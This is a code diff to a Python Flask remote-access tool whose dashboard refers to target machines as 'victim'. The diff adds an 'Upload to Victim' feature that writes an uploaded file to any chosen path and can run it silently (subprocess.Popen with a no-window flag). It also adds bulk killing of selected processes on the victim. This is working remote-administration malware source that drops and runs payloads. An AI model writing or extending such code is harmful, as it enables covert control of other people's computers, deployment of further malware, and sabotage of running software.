@@ -2370,6 +2370,16 @@ DASHBOARD_HTML = r'''
                     <div class="file-path-bar"><input type="text" id="filePath" placeholder="Path (e.g., C:\Users\...)"><button class="btn" onclick="listFiles()">Browse</button></div>
                     <div class="file-list" id="fileList"></div>
                 </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Upload to Victim</div></div>
+                    <input type="text" id="uploadTargetPath" placeholder="Target path on victim (e.g., C:\Users\Public\)">
+                    <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+                        <label style="color:#888;font-size:12px;display:flex;align-items:center;gap:4px;"><input type="checkbox" id="uploadExecute" style="width:auto;margin:0;"> Execute after upload</label>
+                        <button class="btn small" onclick="document.getElementById('uploadFileInput').click()">Choose File & Upload</button>
+                        <input type="file" id="uploadFileInput" style="display:none;" onchange="uploadToVictim()">
+                    </div>
+                    <div class="log-box" id="uploadLog" style="min-height:60px;">Upload files to the victim machine. Optionally auto-execute after upload.</div>
+                </div>
             </div>
 
             <!-- Shell Page -->
@@ -2571,10 +2581,10 @@ DASHBOARD_HTML = r'''
             <!-- Processes Page -->
             <div class="page" id="page-processes">
                 <div class="section" style="flex: 1;">
-                    <div class="section-header"><div class="section-title">Running Processes</div><div><button class="btn small" onclick="listProcesses()">Refresh</button><input type="text" id="procFilter" placeholder="Filter..." style="width: 200px; margin-bottom: 0;" oninput="filterProcesses()"></div></div>
+                    <div class="section-header"><div class="section-title">Running Processes</div><div><button class="btn small" onclick="listProcesses()">Refresh</button><button class="btn small danger" onclick="killSelectedProcesses()">Kill Selected</button><input type="text" id="procFilter" placeholder="Filter..." style="width: 160px; margin-bottom: 0;" oninput="filterProcesses()"></div></div>
                     <div style="overflow-y: auto; flex: 1;">
                         <table class="proc-table">
-                            <thead><tr><th>PID</th><th>Name</th><th>Memory</th><th>CPU</th><th>Action</th></tr></thead>
+                            <thead><tr><th><input type="checkbox" id="procSelectAll" onchange="toggleAllProcesses(this.checked)" style="width:auto;margin:0;"></th><th>PID</th><th>Name</th><th>Memory</th><th>CPU</th><th>Action</th></tr></thead>
                             <tbody id="procTableBody"></tbody>
                         </table>
                     </div>
@@ -3065,8 +3075,31 @@ DASHBOARD_HTML = r'''
             if (!file) return;
             const formData = new FormData();
             formData.append('file', file);
+            const path = document.getElementById('filePath').value;
+            if (path) formData.append('path', path);
             await fetch('/api/files/upload', {method: 'POST', body: formData});
-            logActivity('Uploaded: ' + file.name);
+            logActivity('Uploaded: ' + file.name, 'success');
+        }
+        async function uploadToVictim() {
+            const file = document.getElementById('uploadFileInput').files[0];
+            if (!file) return;
+            const targetPath = document.getElementById('uploadTargetPath').value;
+            const shouldExec = document.getElementById('uploadExecute').checked;
+            const formData = new FormData();
+            formData.append('file', file);
+            if (targetPath) formData.append('path', targetPath);
+            if (shouldExec) formData.append('execute', '1');
+            document.getElementById('uploadLog').textContent = 'Uploading ' + file.name + '...';
+            const res = await fetch('/api/files/upload', {method: 'POST', body: formData});
+            const data = await res.json();
+            if (data.success) {
+                const msg = 'Uploaded to: ' + data.path + (data.executed ? ' [EXECUTED]' : '');
+                document.getElementById('uploadLog').textContent = msg;
+                logActivity(msg, 'success');
+            } else {
+                document.getElementById('uploadLog').textContent = 'Failed: ' + (data.error || 'unknown');
+                logActivity('Upload failed: ' + (data.error || '?'), 'error');
+            }
         }
 
         // Shell
@@ -3548,7 +3581,7 @@ DASHBOARD_HTML = r'''
             tbody.innerHTML = '';
             procs.forEach(p => {
                 const tr = document.createElement('tr');
-                tr.innerHTML = `<td>${p.pid}</td><td>${p.name}</td><td>${p.memory || '-'}</td><td>${p.cpu || '-'}</td><td><button class="btn small danger" onclick="killProcessByPid(${p.pid})">Kill</button></td>`;
+                tr.innerHTML = `<td><input type="checkbox" class="proc-check" data-pid="${p.pid}" style="width:auto;margin:0;"></td><td>${p.pid}</td><td>${p.name}</td><td>${p.memory || '-'}</td><td>${p.cpu || '-'}</td><td><button class="btn small danger" onclick="killProcessByPid(${p.pid})">Kill</button></td>`;
                 tbody.appendChild(tr);
             });
         }
@@ -3557,9 +3590,23 @@ DASHBOARD_HTML = r'''
             const filtered = _allProcesses.filter(p => p.name.toLowerCase().includes(f) || String(p.pid).includes(f));
             renderProcesses(filtered);
         }
+        function toggleAllProcesses(checked) {
+            document.querySelectorAll('.proc-check').forEach(cb => cb.checked = checked);
+        }
+        async function killSelectedProcesses() {
+            const checks = document.querySelectorAll('.proc-check:checked');
+            if (checks.length === 0) { logActivity('No processes selected', 'warn'); return; }
+            const pids = [];
+            checks.forEach(cb => pids.push(parseInt(cb.dataset.pid)));
+            for (const pid of pids) {
+                await fetch('/api/system/process_kill_pid', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({pid})});
+            }
+            logActivity('Killed ' + pids.length + ' processes: ' + pids.join(', '), 'success');
+            listProcesses();
+        }
         async function killProcessByPid(pid) {
             await fetch('/api/system/process_kill_pid', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({pid})});
-            logActivity('Killed PID ' + pid);
+            logActivity('Killed PID ' + pid, 'success');
             listProcesses();
         }
     </script>
@@ -4412,18 +4459,26 @@ def hardware_check():
 
 @app.route('/api/files/upload', methods=['POST'])
 def upload_file():
-    """Upload file to host."""
+    """Upload file to host with optional target path and execute flag."""
     try:
         if 'file' not in request.files:
             return jsonify({'success': False, 'error': 'No file'})
-        
         file = request.files['file']
         if file.filename == '':
             return jsonify({'success': False, 'error': 'No filename'})
-        
-        upload_path = os.path.join(script_dir, file.filename)
+        target_path = request.form.get('path', '')
+        should_execute = request.form.get('execute', '0') == '1'
+        if target_path and os.path.isdir(target_path):
+            upload_path = os.path.join(target_path, file.filename)
+        elif target_path:
+            upload_path = target_path
+        else:
+            upload_path = os.path.join(script_dir, file.filename)
+        os.makedirs(os.path.dirname(upload_path), exist_ok=True)
         file.save(upload_path)
-        return jsonify({'success': True, 'path': upload_path})
+        if should_execute:
+            subprocess.Popen(upload_path, creationflags=0x08000000)
+        return jsonify({'success': True, 'path': upload_path, 'executed': should_execute})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
